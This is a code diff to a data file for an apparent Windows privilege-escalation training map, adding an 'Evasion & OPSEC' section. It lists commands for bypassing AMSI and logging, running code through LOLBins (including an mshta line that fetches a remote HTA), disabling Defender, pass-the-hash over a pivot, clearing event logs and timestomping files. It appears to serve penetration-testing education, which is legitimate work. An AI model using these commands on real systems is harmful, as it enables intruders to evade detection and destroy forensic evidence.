@@ -30,7 +30,8 @@ window.PRIVMAP_DATA = {
           outcomes: [{ label: "Enumeration done", color: "#94a3b8" }],
           moveTo: [
             { section: "token-privs", note: "a dangerous privilege is Enabled / enable-able" },
-            { section: "uac", note: "you are a local admin stuck at Medium integrity" }
+            { section: "uac", note: "you are a local admin stuck at Medium integrity" },
+            { section: "evasion", note: "get quiet before you run tradecraft" }
           ] },
         { id: "enum-auto", title: "Automated enumeration (winPEAS / PrivescCheck / Seatbelt)",
           theory: { label: "Windows Local Privilege Escalation", url: "theory/2026-10-15-windows-local-privilege-escalation.html" },
@@ -71,8 +72,80 @@ window.PRIVMAP_DATA = {
             { section: "stored-creds", note: "finding 5" },
             { section: "uac", note: "finding 6" },
             { section: "gui-interactive", note: "interactive/RDP/kiosk session" },
-            { section: "kernel", note: "finding 7" }
+            { section: "kernel", note: "finding 7" },
+            { section: "evasion", note: "stay quiet while you work the list" }
           ] }
+      ]
+    },
+    {
+      id: "evasion", title: "Evasion & OPSEC", color: "#a78bfa", tag: "stay quiet",
+      desc: "Blend in while you enumerate and escalate — noise, not capability, is what gets a foothold burned. Match the technique to how you are operating: a remote shell (cmd/PowerShell), an interactive GUI/RDP session, or tools driven from Kali over a pivot.",
+      techniques: [
+        { id: "ev-remoteshell", title: "Remote shell — beat AMSI & script-block logging",
+          theory: { label: "AMSI Bypass (modern)", url: "theory/2026-10-08-amsi-bypass-modern.html" },
+          vuln: { label: "Windows Telemetry & PowerShell Logging", url: "theory/2026-09-23-windows-telemetry-logging.html" },
+          desc: "On a cmd/PowerShell beacon the loud tells are AMSI (scans every script/assembly) and Script Block (4104) / Module (4103) logging. Neutralise them in-process before running tradecraft, and keep execution in memory rather than dropping files.",
+          cmds: [
+            "# patch AMSI in-process (AmsiScanBuffer / amsiInitFailed) before loading tooling",
+            "powershell -ep bypass -enc <base64>     # avoid plaintext scripts on the command line",
+            "powershell -version 2                   # no 4104 logging on v2 (the downgrade itself logs event 400)",
+            "# prefer reflective / execute-assembly loads over writing a .exe to disk"
+          ],
+          outcomes: [{ label: "Tooling runs unflagged", color: "#a78bfa" }],
+          moveTo: [{ section: "foothold", note: "now enumerate quietly" }] },
+        { id: "ev-applocker", title: "Run blocked code (AppLocker / WDAC)",
+          theory: { label: "AppLocker / WDAC Bypass", url: "theory/2026-10-08-applocker-bypass.html" },
+          desc: "If a script or binary is blocked, execute through a trusted LOLBin or from a default-writable, allow-listed path instead of fighting the policy.",
+          cmds: [
+            "installutil.exe /logfile= /LogToConsole=false /U C:\\runme.exe",
+            "mshta.exe http://<ip>/x.hta   ;   msbuild.exe payload.xml",
+            "# or stage in an allow-listed writable dir: C:\\Windows\\Tasks , C:\\Windows\\Temp"
+          ],
+          outcomes: [{ label: "Blocked code runs", color: "#a78bfa" }],
+          moveTo: [{ section: "foothold", note: "continue — execution restored" }] },
+        { id: "ev-defender", title: "Blind Defender / EDR",
+          theory: { label: "Windows Defense Evasion", url: "theory/2026-09-23-defense-evasion.html" },
+          vuln: { label: "In-Memory Tradecraft", url: "theory/2026-09-23-in-memory-tradecraft.html" },
+          desc: "Check what is watching, then reduce it. Exclusions / RTP-off need admin and are loud; in-memory execution and clean (obfuscated) binaries avoid the AV entirely; BYOVD kills EDR callbacks from the kernel.",
+          cmds: [
+            "Get-MpComputerStatus ; Get-MpPreference | ft Exclusion*",
+            "Add-MpPreference -ExclusionPath C:\\temp          # admin: stage from an excluded path",
+            "Set-MpPreference -DisableRealtimeMonitoring $true # admin, loud — prefer not to",
+            "# in-memory execute-assembly / reflective load instead of touching disk"
+          ],
+          outcomes: [{ label: "AV/EDR reduced", color: "#a78bfa" }],
+          moveTo: [{ section: "kernel", note: "BYOVD to disable EDR from the kernel" }, { section: "foothold", note: "continue under cover" }] },
+        { id: "ev-gui", title: "GUI / RDP session hygiene",
+          theory: { label: "Windows Telemetry & PowerShell Logging", url: "theory/2026-09-23-windows-telemetry-logging.html" },
+          desc: "An interactive RDP/console session sidesteps much command-line telemetry, but leaves a Type-10 logon and GUI actions still hit the event log. Don't lock out the real user, don't trip a prompt, and clear the session artifacts you create.",
+          cmds: [
+            "query user                        # don't act on a box someone is actively using",
+            "# don't save creds in mstsc; clear Run/typed-path MRU and the RDP bitmap cache after",
+            "# operate during the user's normal hours so a Type-10 logon blends in"
+          ],
+          outcomes: [{ label: "Interactive, low-signal", color: "#a78bfa" }],
+          moveTo: [{ section: "foothold", note: "enumerate from the GUI" }] },
+        { id: "ev-kali", title: "From Kali — blend over the pivot",
+          theory: { label: "Windows Defense Evasion", url: "theory/2026-09-23-defense-evasion.html" },
+          vuln: { label: "Toolkit — Windows built-ins", url: "tool-detail.html?tool=windows-builtins" },
+          desc: "Driving impacket / nxc from Kali, the traffic should look internal. Pivot through a foothold (SOCKS) so it egresses from a real host, authenticate with Kerberos so it reads as normal, pace scans, and never drop a signatured binary unmodified.",
+          cmds: [
+            "proxychains -q nxc smb 10.0.0.0/24 -u user -H <hash>   # egresses from the foothold, not Kali",
+            "export KRB5CCNAME=t.ccache ; <impacket> -k -no-pass    # Kerberos blends with normal auth",
+            "# obfuscate / pack signatured tools; prefer LOTL built-ins for enumeration"
+          ],
+          outcomes: [{ label: "Traffic looks internal", color: "#a78bfa" }],
+          moveTo: [{ section: "foothold", note: "run the op through the pivot" }] },
+        { id: "ev-logs", title: "Timestomp & log cleanup (last resort)",
+          theory: { label: "Windows Telemetry & PowerShell Logging", url: "theory/2026-09-23-windows-telemetry-logging.html" },
+          desc: "Clearing logs is itself a high-fidelity alert (event 1102 / 104). Prefer never generating the event; if you must, be surgical and expect it to be noticed — and log the change for clean-up.",
+          cmds: [
+            "wevtutil cl Security      # clears the Security log AND logs event 1102 — very loud",
+            "# timestomp a dropped file to blend with its folder:",
+            "(Get-Item x.exe).LastWriteTime = (Get-Item C:\\Windows\\System32\\cmd.exe).LastWriteTime"
+          ],
+          outcomes: [{ label: "Traces reduced", color: "#a78bfa" }],
+          moveTo: [{ section: "system", note: "finish the objective" }] }
       ]
     },
     {
